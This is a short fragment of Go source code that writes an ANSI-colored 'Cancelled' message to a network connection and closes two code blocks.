		this.conn.Write([]byte("\x1b[48;5;231m \033[38;5;125mCancelled \033[0m\x1b[1;37m\r\n"))
	}
}
